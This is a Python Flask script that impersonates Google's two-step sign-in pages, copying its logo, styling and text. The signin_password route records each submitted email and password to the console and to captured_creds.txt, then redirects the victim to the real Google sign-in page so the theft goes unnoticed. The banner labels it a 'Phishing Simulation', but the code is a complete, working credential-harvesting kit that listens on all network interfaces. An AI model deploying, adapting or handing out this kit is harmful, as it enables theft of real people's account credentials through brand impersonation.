# app.py — Single file, no templates directory needed
from flask import Flask, render_template_string, request, redirect, url_for, session
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

LOGIN_PAGE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .card {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            max-width: 450px;
            width: 100%;
        }
        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 16px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            color: #202124;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 16px;
            text-align: center;
            color: #202124;
            margin-bottom: 32px;
        }
        .input-group { margin-bottom: 8px; }
        .input-group input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.2s;
        }
        .input-group input:focus { border-color: #1a73e8; }
        .input-group input::placeholder { color: #80868b; }
        .info-text {
            font-size: 12px;
            color: #5f6368;
            margin: 8px 0 32px;
            line-height: 1.5;
        }
        .info-text a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }
        .info-text a:hover { text-decoration: underline; }
        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }
        .btn-link {
            color: #1a73e8;
            font-weight: 500;
            font-size: 14px;
            background: none;
            border: none;
            cursor: pointer;
            text-decoration: none;
            padding: 0;
        }
        .btn-link:hover { color: #1765cc; }
        .btn-primary {
            background: #1a73e8;
            color: #fff;
            border: none;
            padding: 9px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-primary:hover { background: #1765cc; }
        .footer {
            margin-top: 24px;
            display: flex;
            justify-content: space-between;
            font-size: 12px;
        }
        .footer a {
            color: #5f6368;
            text-decoration: none;
        }
        .footer a:hover { color: #1a73e8; }
        .lang-select {
            color: #5f6368;
            border: none;
            background: none;
            font-size: 12px;
            cursor: pointer;
            outline: none;
        }
        .lang-select:hover { color: #1a73e8; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
                <path d="M9.24 8.19v2.46h5.88c-.18 1.38-.72 2.52-1.56 3.3-.78.72-1.92 1.2-4.32 1.2-3.42 0-6.18-2.76-6.18-6.18S5.82 2.79 9.24 2.79c1.68 0 3.12.6 4.26 1.56l1.74-1.74C13.32 1.29 11.4.45 9.24.45 4.38.45.3 4.53.3 9.39s4.08 8.94 8.94 8.94c3.78 0 7.14-2.16 8.16-6.12.24-.9.36-1.86.36-2.82v-1.2H9.24z" fill="#4285F4"/>
                <path d="M34.69 9.39c0-4.08-3.12-6.84-7.32-6.84-4.2 0-7.32 2.76-7.32 6.84s3.12 6.84 7.32 6.84c4.2 0 7.32-2.76 7.32-6.84zm-5.46 0c0 2.46-1.02 3.84-1.86 3.84-.84 0-1.86-1.38-1.86-3.84s1.02-3.84 1.86-3.84c.84 0 1.86 1.38 1.86 3.84z" fill="#EA4335"/>
                <path d="M43.22 9.39c0-4.08-3.12-6.84-7.32-6.84-4.2 0-7.32 2.76-7.32 6.84s3.12 6.84 7.32 6.84c4.2 0 7.32-2.76 7.32-6.84zm-5.46 0c0 2.46-1.02 3.84-1.86 3.84-.84 0-1.86-1.38-1.86-3.84s1.02-3.84 1.86-3.84c.84 0 1.86 1.38 1.86 3.84z" fill="#FBBC05"/>
                <path d="M56.91 3.09v11.28h-5.1V3.09h-2.16v-2.1h9.42v2.1h-2.16z" fill="#34A853"/>
                <path d="M72.13 2.61v11.76h-4.44V14.1c-.9 1.08-2.1 1.44-3.54 1.44-2.58 0-4.86-2.04-4.86-6.12s2.22-6.12 4.86-6.12c1.44 0 2.64.36 3.54 1.08V2.61h4.44zm-4.44 6.78c0-2.16-.96-3.54-2.28-3.54-1.32 0-2.28 1.38-2.28 3.54s.96 3.54 2.28 3.54c1.32 0 2.28-1.38 2.28-3.54z" fill="#4285F4"/>
            </svg>
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>

        <form action="/signin" method="POST">
            <div class="input-group">
                <input type="email" name="email" placeholder="Email or phone" required autofocus>
            </div>
            <p class="info-text"><a href="#">Forgot email?</a></p>
            <p class="info-text">
                Not your computer? Use Guest mode to sign in privately.
                <a href="#">Learn more about using Guest mode</a>
            </p>
            <div class="actions">
                <a href="#" class="btn-link">Create account</a>
                <button type="submit" class="btn-primary">Next</button>
            </div>
        </form>

        <div class="footer">
            <select class="lang-select">
                <option>English (United States)</option>
                <option>Espa&ntilde;ol</option>
                <option>Fran&ccedil;ais</option>
            </select>
            <div>
                <a href="#">Help</a>&nbsp;&nbsp;
                <a href="#">Privacy</a>&nbsp;&nbsp;
                <a href="#">Terms</a>
            </div>
        </div>
    </div>
</body>
</html>'''

PASSWORD_PAGE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .card {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            max-width: 450px;
            width: 100%;
        }
        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 16px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            color: #202124;
            margin-bottom: 8px;
        }
        .user-info {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 32px;
            gap: 8px;
            color: #5f6368;
            font-size: 14px;
        }
        .user-info .avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: #1a73e8;
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 500;
            font-size: 14px;
        }
        .user-info a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            font-size: 12px;
        }
        .input-group {
            margin-bottom: 8px;
            position: relative;
        }
        .input-group input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.2s;
        }
        .input-group input:focus { border-color: #1a73e8; }
        .input-group .show-btn {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #1a73e8;
            font-weight: 500;
            font-size: 12px;
            cursor: pointer;
            text-transform: uppercase;
            padding: 4px 8px;
        }
        .info-text {
            font-size: 12px;
            color: #5f6368;
            margin: 8px 0 0;
            line-height: 1.5;
        }
        .info-text a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }
        .info-text a:hover { text-decoration: underline; }
        .password-toggle {
            display: flex;
            align-items: center;
            margin-top: 4px;
        }
        .password-toggle input[type="checkbox"] {
            margin-right: 8px;
            accent-color: #1a73e8;
        }
        .password-toggle label {
            font-size: 14px;
            color: #3c4043;
        }
        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 40px;
        }
        .btn-link {
            color: #1a73e8;
            font-weight: 500;
            font-size: 14px;
            background: none;
            border: none;
            cursor: pointer;
            text-decoration: none;
            padding: 0;
        }
        .btn-link:hover { color: #1765cc; }
        .btn-primary {
            background: #1a73e8;
            color: #fff;
            border: none;
            padding: 9px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-primary:hover { background: #1765cc; }
        .footer {
            margin-top: 24px;
            display: flex;
            justify-content: space-between;
            font-size: 12px;
        }
        .footer a {
            color: #5f6368;
            text-decoration: none;
        }
        .footer a:hover { color: #1a73e8; }
        .lang-select {
            color: #5f6368;
            border: none;
            background: none;
            font-size: 12px;
            cursor: pointer;
            outline: none;
        }
        .lang-select:hover { color: #1a73e8; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
                <path d="M9.24 8.19v2.46h5.88c-.18 1.38-.72 2.52-1.56 3.3-.78.72-1.92 1.2-4.32 1.2-3.42 0-6.18-2.76-6.18-6.18S5.82 2.79 9.24 2.79c1.68 0 3.12.6 4.26 1.56l1.74-1.74C13.32 1.29 11.4.45 9.24.45 4.38.45.3 4.53.3 9.39s4.08 8.94 8.94 8.94c3.78 0 7.14-2.16 8.16-6.12.24-.9.36-1.86.36-2.82v-1.2H9.24z" fill="#4285F4"/>
                <path d="M34.69 9.39c0-4.08-3.12-6.84-7.32-6.84-4.2 0-7.32 2.76-7.32 6.84s3.12 6.84 7.32 6.84c4.2 0 7.32-2.76 7.32-6.84zm-5.46 0c0 2.46-1.02 3.84-1.86 3.84-.84 0-1.86-1.38-1.86-3.84s1.02-3.84 1.86-3.84c.84 0 1.86 1.38 1.86 3.84z" fill="#EA4335"/>
                <path d="M43.22 9.39c0-4.08-3.12-6.84-7.32-6.84-4.2 0-7.32 2.76-7.32 6.84s3.12 6.84 7.32 6.84c4.2 0 7.32-2.76 7.32-6.84zm-5.46 0c0 2.46-1.02 3.84-1.86 3.84-.84 0-1.86-1.38-1.86-3.84s1.02-3.84 1.86-3.84c.84 0 1.86 1.38 1.86 3.84z" fill="#FBBC05"/>
                <path d="M56.91 3.09v11.28h-5.1V3.09h-2.16v-2.1h9.42v2.1h-2.16z" fill="#34A853"/>
                <path d="M72.13 2.61v11.76h-4.44V14.1c-.9 1.08-2.1 1.44-3.54 1.44-2.58 0-4.86-2.04-4.86-6.12s2.22-6.12 4.86-6.12c1.44 0 2.64.36 3.54 1.08V2.61h4.44zm-4.44 6.78c0-2.16-.96-3.54-2.28-3.54-1.32 0-2.28 1.38-2.28 3.54s.96 3.54 2.28 3.54c1.32 0 2.28-1.38 2.28-3.54z" fill="#4285F4"/>
            </svg>
        </div>
        <h1>Welcome</h1>

        <div class="user-info">
            <div class="avatar">{{ email[:1].upper() }}</div>
            <span>{{ email }}</span>
            <a href="/reset">Not you?</a>
        </div>

        <form action="/signin/password" method="POST">
            <div class="input-group">
                <input type="password" name="password" id="password" placeholder="Enter your password" required autofocus>
                <button type="button" class="show-btn" id="showBtn" onclick="togglePassword()">Show</button>
            </div>
            <div class="password-toggle">
                <input type="checkbox" id="show-password" onclick="togglePassword()">
                <label for="show-password">Show password</label>
            </div>
            <p class="info-text" style="margin-top:16px;"><a href="#">Forgot password?</a></p>
            <div class="actions">
                <a href="/reset" class="btn-link">Create account</a>
                <button type="submit" class="btn-primary">Next</button>
            </div>
        </form>

        <div class="footer">
            <select class="lang-select">
                <option>English (United States)</option>
                <option>Espa&ntilde;ol</option>
                <option>Fran&ccedil;ais</option>
            </select>
            <div>
                <a href="#">Help</a>&nbsp;&nbsp;
                <a href="#">Privacy</a>&nbsp;&nbsp;
                <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script>
        function togglePassword() {
            const pwd = document.getElementById('password');
            const btn = document.getElementById('showBtn');
            if (pwd.type === 'password') {
                pwd.type = 'text';
                btn.textContent = 'Hide';
            } else {
                pwd.type = 'password';
                btn.textContent = 'Show';
            }
        }
    </script>
</body>
</html>'''

@app.route('/')
def index():
    return render_template_string(LOGIN_PAGE)

@app.route('/signin', methods=['POST'])
def signin():
    email = request.form.get('email', '')
    session['email'] = email
    return redirect(url_for('password'))

@app.route('/password')
def password():
    if 'email' not in session:
        return redirect(url_for('index'))
    return render_template_string(PASSWORD_PAGE, email=session.get('email'))

@app.route('/signin/password', methods=['POST'])
def signin_password():
    email = session.get('email', '')
    password = request.form.get('password', '')

    # Log captured credentials to console
    print(f"\n[+] CREDENTIALS CAPTURED")
    print(f"    Email:    {email}")
    print(f"    Password: {password}")
    print(f"    [*] Written to captured_creds.txt\n")

    # Write to file
    with open('captured_creds.txt', 'a') as f:
        f.write(f"Email: {email} | Password: {password}\n")

    # Redirect to real Google
    return redirect('https://accounts.google.com')

@app.route('/reset')
def reset():
    session.clear()
    return redirect(url_for('index'))

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════╗
    ║   Google Login Phishing Simulation   ║
    ║   Running on http://localhost:5000   ║
    ║   Ctrl+C to stop                     ║
    ╚══════════════════════════════════════╝
    """)
    app.run(debug=True, host='0.0.0.0', port=5000) 
